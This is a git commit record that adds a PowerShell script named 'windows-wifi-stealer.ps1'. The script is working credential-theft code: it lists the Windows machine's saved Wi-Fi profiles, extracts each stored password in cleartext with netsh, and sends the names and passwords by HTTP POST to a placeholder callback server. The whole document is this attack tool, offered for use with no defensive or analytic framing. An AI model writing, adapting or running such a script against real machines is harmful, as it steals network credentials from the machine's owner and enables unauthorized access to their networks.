c7239b7fada45dfed3128441a615b8b15c70809e
Jack Rendor <jackrendor@gmail.com>
2022-08-10 11:43:51 +0200

    First commit

---
+++ windows-wifi-stealer.ps1
@@ -0,0 +1,11 @@
+﻿$CALLBACK = "https://your.callbackserver.com"
+$BODY = @{}
+$STRVALUE = (netsh.exe wlan show profiles | Select-String -Pattern All -AllMatches -List)
+foreach ($value in $STRVALUE) {
+    $name=$value.ToString().Split(":")[1].Trim();
+    $password=(netsh.exe wlan show profiles name=$name key=clear | Select-String -Pattern "Key Content" -AllMatches -List)
+    if ( $password -ne $null ){
+        $BODY.Add($name, $password.ToString().Split(":")[1].Trim())
+    }
+}
+Invoke-WebRequest -Uri $CALLBACK -Body $BODY -Method POST
